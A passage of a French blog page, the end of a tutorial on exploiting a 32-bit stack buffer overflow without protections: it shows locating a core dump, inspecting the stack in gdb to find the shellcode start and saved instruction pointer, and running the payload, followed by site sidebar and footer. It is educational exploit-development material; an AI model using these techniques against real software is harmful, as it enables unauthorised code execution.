+<p><img src="/img/binary/4-coredumped.png" alt="4-coredumped.png"></p>
+<p>Comme vous pouvez le voir, le programme retourne un <code>segmentation fault (core dumped)</code> ce qui est normal.</p>
+<p>Maintenant, on va chercher ce dump :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">しのぶ » coredumpctl list
+</code></pre></div><p><img src="/img/binary/4-coredumpctl-list.png" alt="4-coredumpctl-list.png"></p>
+<p>Une liste de dump est affichée, on récupère le PID du tout dernier.</p>
+<p>Ensuite on ouvre le dump avec gdb :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">しのぶ » coredumpctl gdb <span style="color:#ae81ff">7524</span>
+</code></pre></div><p>On affiche la stack à partir du registre ESP:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gef➤  x/80x $esp-180
+</code></pre></div><p><img src="/img/binary/4-stack-esp.png" alt="4-stack-esp.png">
+<em>lecture de droite à gauche par colonne et de gauche à droite par ligne</em></p>
+<p>Vous devriez avoir quelque chose comme ceci :</p>
+<ul>
+<li>En vert nous avons le début de notre shellcode (31,c9,31,2d)</li>
+<li>En jaune on a le &ldquo;AAAA&rdquo; de notre payload</li>
+<li>En violet les NOP</li>
+<li>Et enfin en rouge notre SIP</li>
+</ul>
+<p>Alors attention ! Il ne faut pas toujours prendre l&rsquo;adresse de droite, il faut prendre l&rsquo;adresse de début du shellcode.</p>
+<p>Bien souvent il faut incrémenter l&rsquo;adresse jusqu&rsquo;a tomber dessus, une bonne technique est d&rsquo;utiliser la commande suivante :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gef➤  x/1xb &lt;address&gt;
+</code></pre></div><p>Vous placez votre adresse et augmentez de 1 (en hexa) jusqu'à tomber sur votre &ldquo;\x31&rdquo; :
+<img src="/img/binary/4-found-sip.png" alt="4-found-sip.png"></p>
+<h3 id="pwned-">Pwned !</h3>
+<p>Maintenant que votre payload est complet, il ne vous reste plus qu'à l&rsquo;executer !</p>
+<p><img src="/img/binary/4-pwned-.png" alt="4-pwned-.png"></p>
+
+  </div>
+
+  <footer>
+    <ul class="stats">
+  <li class="categories">
+    <ul>
+        
+            
+            
+                <i class="fa fa-folder"></i>
+                
+                
+                <li><a class="article-category-link" href="/categories/exploitation-binaire">Exploitation-Binaire</a></li>
+                
+            
+        
+    </ul>
+  </li>
+  <li class="tags">
+    <ul>
+        
+    </ul>
+  </li>
+</ul>
+
+  </footer>
+
+</article>
+
+
+<ul class="actions pagination">
+    
+        <li><a href="/blog-fr/tuto/pop-os-installation-btrfs/"
+                class="button big previous">Installation POP_OS! 20.04 LUKS EFI et BTRFS</a></li>
+    
+
+    
+        <li><a href="/blog-fr/archlinux/arch-postinstall/"
+                class="button big next">🇫🇷  Archlinux Post-Install !</a></li>
+    
+</ul>
+
+
+    </div>
+    
+<section id="sidebar">
+
+  
+  <section id="intro">
+    
+    
+      
+        <a href='/'><img src="/img/main/logo.jpg" class="intro-circle" width="250" alt="AlrikRr" /></a>
+      
+    
+    
+      <header>
+        <h2>Hello, friend.</h2>
+        <p>The greatest enemy of knowledge is not ignorance, it is the illusion of knowledge.</p>
+      </header>
+    
+    
+      <ul class="icons">
+        
+          
+    <li><a href="/index.xml" type="application/rss+xml" target="_blank" title="RSS" class="fa fa-rss"></a></li>
+
+
+        
+        
+  <li><a href="//github.com/AlrikRr" target="_blank" title="GitHub" class="fa fa-github"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <li><a href="//linkedin.com/in/adrien-lasalle" target="_blank" title="LinkedIn" class="fa fa-linkedin"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <li><a href="//reddit.com/user/AlrikRr" target="_blank" title="Reddit" class="fa fa-reddit"></a></li>
+
+
+
+
+
+  <li><a href="//youtube.com/https://www.youtube.com/channel/UCnfAzfzPenSKIRLUCtKA4VA" target="_blank" title="YouTube" class="fa fa-youtube"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <li><a href="//twitter.com/AlrikRr" target="_blank" title="Twitter" class="fa fa-twitter"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      </ul>
+    
+  </section>
+
+  
+  <section class="recent-posts">
+    <div class="mini-posts">
+      <header>
+        <h3>Recent Posts</h3>
+      </header>
+      <div class="posts-container">
+        
+
+        
+          
+        
+
+        
+          <article class="mini-post">
+            <header>
+              <h3>
+                <a href="/blog-fr/iot/p4wnp1-rubberducky/">🇫🇷  #2 P4wnP1:ALOA RubberDucky</a>
+              </h3>
+              
+              <time class="published" datetime='2020-11-18'>
+                November 18, 2020
+              </time>
+            </header>
+            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/iot/p4wnp1-rubberducky/" class="image featured">
+            <img src="/img//iot/P4-RubberDucky/P4wnP1-rubberducky-banner.png" alt="">
+        </a>
+    
+
+
+          </article>
+        
+          <article class="mini-post">
+            <header>
+              <h3>
+                <a href="/blog-fr/iot/p4wnp1-installation/">🇫🇷  #1 P4wnP1:ALOA Installation</a>
+              </h3>
+              
+              <time class="published" datetime='2020-11-11'>
+                November 11, 2020
+              </time>
+            </header>
+            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/iot/p4wnp1-installation/" class="image featured">
+            <img src="/img//iot/P4/P4wnP1-install-banner.png" alt="">
+        </a>
+    
+
+
+          </article>
+        
+          <article class="mini-post">
+            <header>
+              <h3>
+                <a href="/blog-fr/binary/6-ret2libc/">🇫🇷  Ret2libc avec protection NX</a>
+              </h3>
+              
+              <time class="published" datetime='2020-09-18'>
+                September 18, 2020
+              </time>
+            </header>
+            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/binary/6-ret2libc/" class="image featured">
+            <img src="/img//binary/6-ret2lib-banner.png" alt="">
+        </a>
+    
+
+
+          </article>
+        
+          <article class="mini-post">
+            <header>
+              <h3>
+                <a href="/blog-fr/binary/5-ret2win/">🇫🇷  ROP32 sans protection</a>
+              </h3>
+              
+              <time class="published" datetime='2020-09-15'>
+                September 15, 2020
+              </time>
+            </header>
+            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/binary/5-ret2win/" class="image featured">
+            <img src="/img//binary/5-ret2win-binary.png" alt="">
+        </a>
+    
+
+
+          </article>
+        
+          <article class="mini-post">
+            <header>
+              <h3>
+                <a href="/blog-fr/archlinux/arch-postinstall/">🇫🇷  Archlinux Post-Install !</a>
+              </h3>
+              
+              <time class="published" datetime='2020-09-14'>
+                September 14, 2020
+              </time>
+            </header>
+            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/archlinux/arch-postinstall/" class="image featured">
+            <img src="/img//arch/arch-post/arch-banner.png" alt="">
+        </a>
+    
+
+
+          </article>
+        
+          <article class="mini-post">
+            <header>
+              <h3>
+                <a href="/blog-fr/binary/4-bufferoverflow/">🇫🇷  BufferOverflow 32bits sans protection</a>
+              </h3>
+              
+              <time class="published" datetime='2020-09-12'>
+                September 12, 2020
+              </time>
+            </header>
+            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/binary/4-bufferoverflow/" class="image featured">
+            <img src="/img//binary/4-binary-bufferoverflow.png" alt="">
+        </a>
+    
+
+
+          </article>
+        
+      </div>
+
+      
+        <a href=
+          
+            /blog/
+          
+        class="button">View more posts</a>
+      
+    </div>
+  </section>
+
+  
+  
+  
+  
+  
+    <section id="categories">
+      <header>
+        <h3>
+          <a href="/categories/">Categories</a>
+        </h3>
+      </header>
+        
+          
+        
+
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/hackthebox/">hackthebox</a>
+                <span style="float:right;">6</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/tuto/">tuto</a>
+                <span style="float:right;">6</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/projects/">projects</a>
+                <span style="float:right;">5</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/en-nixos/">en-nixos</a>
+                <span style="float:right;">4</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/fr-nixos/">fr-nixos</a>
+                <span style="float:right;">4</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/exploitation-binaire/">exploitation-binaire</a>
+                <span style="float:right;">3</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/iot/">iot</a>
+                <span style="float:right;">3</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/machine-learning/">machine-learning</a>
+                <span style="float:right;">3</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/archlinux/">archlinux</a>
+                <span style="float:right;">2</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/hacking/">hacking</a>
+                <span style="float:right;">2</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/android/">android</a>
+                <span style="float:right;">1</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/project/">project</a>
+                <span style="float:right;">1</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/raspberry/">raspberry</a>
+                <span style="float:right;">1</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/s%C3%A9curit%C3%A9/">sécurité</a>
+                <span style="float:right;">1</span>
+              
+            </header>
+          </article>
+        </p>
+        
+    </section>
+  
+  
+
+  
+  
+
+  
+  <section id="footer">
+    
+      <ul class="icons">
+        
+          
+    <li><a href="/index.xml" type="application/rss+xml" target="_blank" title="RSS" class="fa fa-rss"></a></li>
+
+
+        
+        
+  <li><a href="//github.com/AlrikRr" target="_blank" title="GitHub" class="fa fa-github"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <li><a href="//linkedin.com/in/adrien-lasalle" target="_blank" title="LinkedIn" class="fa fa-linkedin"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <li><a href="//reddit.com/user/AlrikRr" target="_blank" title="Reddit" class="fa fa-reddit"></a></li>
+
+
+
+
+
+  <li><a href="//youtube.com/https://www.youtube.com/channel/UCnfAzfzPenSKIRLUCtKA4VA" target="_blank" title="YouTube" class="fa fa-youtube"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <li><a href="//twitter.com/AlrikRr" target="_blank" title="Twitter" class="fa fa-twitter"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      </ul>
+    
+    <p class="copyright">
+      
+        &copy; 2021
+        
+          AlrikRr-Blog
+        
+      .
+      Powered by <a href="//gohugo.io" target="_blank">Hugo</a>
+    </p>
+  </section>
+</section>
+
+    </div>
+    <a id="back-to-top" href="#" class="fa fa-arrow-up fa-border fa-2x"></a>
+    
+
+    
+      
+    
+
+    
+      
+      
+      
+        <script src="//cdn.bootcss.com/highlight.js/9.11.0/highlight.min.js"></script>
+        
+        
+        
+        <script src="//cdn.bootcss.com/highlight.js/9.11.0/languages/r.min.js"></script>
+        <script src="//cdn.bootcss.com/highlight.js/9.11.0/languages/yaml.min.js"></script>
+        <script src="//cdn.bootcss.com/highlight.js/9.11.0/languages/css.min.js"></script>
+        <script>hljs.configure({languages: []}); hljs.initHighlightingOnLoad();</script>
+      
+    
+    
+    
+      <script src="https://code.jquery.com/jquery-3.2.1.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/skel/3.0.1/skel.min.js"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.1.25/jquery.fancybox.min.js"></script>
+      <script src="/js/util.js"></script>
+      <script src="/js/main.js"></script>
+      <script src="/js/backToTop.js"></script>
+    
+
+    
+      
+        
+      
+    
+
+    
+    <script>hljs.initHighlightingOnLoad();</script>
+      <script src="//yihui.name/js/math-code.js"></script>
+<script async
+src="//cdn.bootcss.com/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+  </body>
+</html>
+
